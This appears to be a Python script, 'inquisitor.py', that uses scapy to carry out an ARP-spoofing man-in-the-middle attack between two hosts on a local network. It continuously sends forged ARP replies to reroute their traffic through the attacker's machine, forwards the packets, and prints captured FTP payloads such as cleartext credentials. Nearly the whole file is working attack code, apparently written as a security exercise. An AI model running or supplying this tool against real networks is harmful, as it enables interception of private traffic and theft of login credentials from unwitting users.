import sys
import ipaddress
import re
import signal
import uuid
import socket
import time
from scapy.all import ls, sniff, PacketList, Packet, Raw
from scapy.sendrecv import sendp, sr1, AsyncSniffer
from scapy.interfaces import get_if_list
from scapy.layers.l2 import Ether, ARP
from scapy.layers.inet import IP, TCP


IFACE='eth0'

OP_REQUEST=1
OP_REPLY=2
ARP_PORT=219
FTP_PORT=21
SNIFFER=None

class InquisitorException(Exception):
    pass

def get_ip(arg: str):
    try:
        ip = ipaddress.ip_address(arg)
        if isinstance(ip, ipaddress.IPv6Address):
            raise InquisitorException(f"{arg} not a valid address ipv4")
        return ip
    except Exception as e:
        raise InquisitorException(f"{arg} not a valid address ipv4")

def get_mac(arg:str):
    try:
        if re.match("^[0-9a-f]{2}([:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", arg.lower()):
            if len(arg) == 17:
                return bytes.fromhex("".join(arg.split(":")))
    except Exception as e:
        raise InquisitorException(f"{arg} not a mac address -- {e}")
    raise InquisitorException(f"{arg} not a mac address")

def padding(data: bytes, length: int):
    if len(data) < length:
        data = data + b"\x00" * (length - len(data))
    return data

def get_ether_frame(src_mac: bytes, dst_mac: bytes | None, length: int):
    if dst_mac is None:
        dst_mac = b"\xff" * 6
    preambule = b"\x00" * 7
    sfd = 0b10101011.to_bytes(1, "big")
    length = (length + 7 + 1 + 6 * 2 + 2 + 4).to_bytes(2, "big")
    return preambule + sfd + dst_mac + src_mac + length

def get_my_ip():
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    return ipaddress.IPv4Address(IPAddr)

def send_arp_request(ip: str, mac_addr: str):
    pass

def get_mac_for_ip(ip_src: ipaddress.IPv4Address, mac_src: bytes, ip_dst: ipaddress.IPv4Address) -> str | None:
    res = sr1(ARP(op=OP_REQUEST, psrc=str(ip_src), pdst=str(ip_dst), hwsrc=mac_src))
    if isinstance(res, ARP):
        if not ( hasattr(res, "op") and hasattr(res, "psrc") and hasattr(res, "hwdst") and hasattr(res, "pdst") ):
            return None
        if res.op == OP_REPLY and res.psrc == str(ip_dst) and get_mac(res.hwdst) == mac_src and res.pdst == str(ip_src):
            return res.hwsrc
    return None

def send_arp(ip_src: ipaddress.IPv4Address, mac_src: bytes, ip_dst: ipaddress.IPv4Address, mac_dst: bytes) -> PacketList | None:
    a = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op=OP_REPLY, psrc=str(ip_src), pdst=str(ip_dst), hwsrc=mac_src, hwdst=mac_dst, hwlen=6, plen=4)
    return sendp(a, IFACE, verbose=False)

def main(argv: list[str]):
    if len(argv) != 5:
        raise InquisitorException("need 4 arguments")
    str_ip_src = argv[1]
    str_ip_target = argv[3]
    str_mac_src = argv[2]
    str_mac_target = argv[4]
    ip_src = get_ip(str_ip_src)
    mac_src = get_mac(str_mac_src)
    ip_target = get_ip(str_ip_target)
    mac_target = get_mac(str_mac_target)
    my_mac_addr = uuid.getnode().to_bytes(6, "big")
    my_ip_addr = get_my_ip()
    str_my_ip_addr = str(my_ip_addr)
    print("me", my_ip_addr, my_mac_addr)
    print("src", ip_src, mac_src)
    print("target", ip_target, mac_target)
    iface = get_if_list()
    if IFACE not in iface:
        raise InquisitorException(f"interface {IFACE} not found")
    if ip_src == ip_target or mac_src == mac_target:
        raise InquisitorException(f"src and target are the same (IP or MAC)")
    test_mac = get_mac_for_ip(my_ip_addr, my_mac_addr, ip_src)
    if test_mac != str_mac_src:
        raise InquisitorException(f"Parameter error : {ip_src} not corresponding to {str_mac_src}, it is {test_mac}")
    test_mac = get_mac_for_ip(my_ip_addr, my_mac_addr, ip_target)
    if test_mac != str_mac_target:
        raise InquisitorException(f"Parameter error : {ip_target} not corresponding to {str_mac_target}, it is {test_mac}")

    ips = {str_ip_src: str_mac_src, str_ip_target: str_mac_target}
    SNIFFER = AsyncSniffer(iface=IFACE, lfilter=lambda x: (x.haslayer(Ether) and x.haslayer(IP) and get_mac(x[Ether].dst) == my_mac_addr and x[IP].src in ips.keys() and x[IP].dst in ips.keys()))
    SNIFFER.start()
    while True:
        send_arp(ip_target, my_mac_addr, ip_src, mac_src)
        send_arp(ip_src, my_mac_addr, ip_target, mac_target)
        time.sleep(.2)
        r: list[Packet] | None = SNIFFER.stop()
        SNIFFER.start()
        if r is not None:
            # print(r, len(r))
            for p in r:
                # print(p)
                # p.show()
                if Raw in p and FTP_PORT in [p[TCP].sport, p[TCP].dport]:
                    print(f"{p[IP].src} -> {p[IP].dst} : {p[Raw].load.decode()}")
                p[Ether].src = my_mac_addr
                p[Ether].dst = ips[p[IP].dst]
                sendp(p, IFACE, verbose=False)


def usage():
    print("""
python3 inquisitor.py <IP-src> <MAC-src> <IP-target> <SRC-target>
""")

def signal_handler(signum, frame):
    print("Ctrl+C caught! Exiting gracefully...")
    print("Restore arp tables")
    my_mac_addr = uuid.getnode().to_bytes(6, "big")
    my_ip_addr = get_my_ip()
    send_arp(my_ip_addr, my_mac_addr, ipaddress.IPv4Address(sys.argv[1]), get_mac(sys.argv[2]))
    send_arp(my_ip_addr, my_mac_addr, ipaddress.IPv4Address(sys.argv[3]), get_mac(sys.argv[4]))
    send_arp(ipaddress.IPv4Address(sys.argv[3]), get_mac(sys.argv[4]), ipaddress.IPv4Address(sys.argv[1]), get_mac(sys.argv[2]))
    send_arp(ipaddress.IPv4Address(sys.argv[1]), get_mac(sys.argv[2]), ipaddress.IPv4Address(sys.argv[3]), get_mac(sys.argv[4]))
    sys.exit(0)

if __name__ == '__main__':
    try:
        signal.signal(signal.SIGINT, signal_handler)
        main(sys.argv)
    except InquisitorException as e:
        print(f"Error : {e}")
        usage()
